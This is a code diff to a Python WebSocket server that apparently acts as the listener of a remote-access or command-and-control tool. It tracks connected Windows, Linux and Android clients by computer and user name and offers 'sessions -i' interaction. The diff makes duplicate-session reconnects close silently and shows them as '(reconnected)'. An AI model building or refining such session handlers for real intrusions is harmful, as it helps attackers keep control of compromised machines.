@@ -418,19 +418,25 @@ class WebSocketServer:
         
         client_ip = websocket.remote_address[0]
         
+        # Track if this might be a quick reconnect (don't show "opened" message yet)
+        is_quick_reconnect = False
+        
         # Check for very recent duplicate connection from same IP (race condition)
         for sid, session in list(self.sessions.items()):
             if session.get('addr') and session['addr'][0] == client_ip:
                 time_diff = (datetime.now() - session.get('start_time', datetime.now())).total_seconds()
-                if time_diff < 2:  # Within 2 seconds = likely duplicate
-                    # Close the older one
+                if time_diff < 5:  # Within 5 seconds = likely reconnect
+                    is_quick_reconnect = True
+                    # Close the older one silently
                     try:
                         await session['websocket'].close()
                     except:
                         pass
                     if sid in self.sessions:
                         del self.sessions[sid]
-                    self.async_print(f"\033[93m[!]\033[0m Closed duplicate session {sid} from {client_ip}")
+                    if self.active_session == sid:
+                        self.active_session = None
+                    # Don't print message here - will show combined message when client info received
         
         self.sessions[session_id] = {
             'websocket': websocket,
@@ -444,16 +450,18 @@ class WebSocketServer:
             'computer': 'Unknown',
             'user': 'Unknown',
             'client_id': 'Unknown',  # Unique client identifier
-            'os_type': 'unknown'  # windows, linux, android
+            'os_type': 'unknown',  # windows, linux, android
+            'is_quick_reconnect': is_quick_reconnect  # Track if this was a reconnect
         }
         
         GREEN = '\033[92m'
         CYAN = '\033[96m'
         RESET = '\033[0m'
         
-        # Show notification immediately without breaking input
-        self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} opened (waiting for info...)")
-        self.async_print(f"{GREEN}[*]{RESET} Use '{CYAN}sessions -i {session_id}{RESET}' to interact")
+        # Only show "opened" message if not a quick reconnect (will show proper message when info received)
+        if not is_quick_reconnect:
+            self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} opened (waiting for info...)")
+            self.async_print(f"{GREEN}[*]{RESET} Use '{CYAN}sessions -i {session_id}{RESET}' to interact")
         
         try:
             async for message in websocket:
@@ -509,8 +517,9 @@ class WebSocketServer:
                         if session['computer'] != 'Unknown':
                             # Check for duplicate session using ClientID (preferred) or computer/user
                             dup_sid = self.find_duplicate_session(session['computer'], session['user'], client_ip, session.get('client_id'))
+                            closed_dup = False
                             if dup_sid and dup_sid != session_id:
-                                # Close the older duplicate session
+                                # Close the older duplicate session silently
                                 try:
                                     old_ws = self.sessions[dup_sid]['websocket']
                                     await old_ws.close()
@@ -520,10 +529,15 @@ class WebSocketServer:
                                     del self.sessions[dup_sid]
                                 if self.active_session == dup_sid:
                                     self.active_session = None
-                                self.async_print(f"\033[93m[!]\033[0m Closed duplicate session {dup_sid} (same client: {session.get('client_id', session['computer'])})")
+                                closed_dup = True
                             
                             os_label = session['os_type'].upper() if session['os_type'] != 'unknown' else 'UNKNOWN'
-                            self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET}")
+                            
+                            # Show appropriate message based on reconnect status
+                            if session.get('is_quick_reconnect') or closed_dup:
+                                self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET} (reconnected)")
+                            else:
+                                self.async_print(f"{GREEN}[+]{RESET} Session {CYAN}{session_id}{RESET} [{os_label}]: {CYAN}{session['computer']}\\{session['user']}{RESET}")
                 except:
                     pass
                 
@@ -688,12 +702,16 @@ class WebSocketServer:
             self.async_print(f"\033[91m[!]\033[0m Error: {e}")
         finally:
             was_active = (self.active_session == session_id)
-            if session_id in self.sessions:
+            # Only show "closed" message if session still exists (wasn't already removed as duplicate)
+            session_existed = session_id in self.sessions
+            if session_existed:
                 del self.sessions[session_id]
             # Don't clear active_session here - let interact() handle it via finally block
             # This prevents race conditions where prompt gets stuck
             
-            self.async_print(f"\033[91m[-]\033[0m Session \033[96m{session_id}\033[0m closed")
+            # Only show closed message if session wasn't already removed as a duplicate
+            if session_existed:
+                self.async_print(f"\033[91m[-]\033[0m Session \033[96m{session_id}\033[0m closed")
             if was_active:
                 self.async_print("[!] You were interacting with this session - returned to server prompt")
     
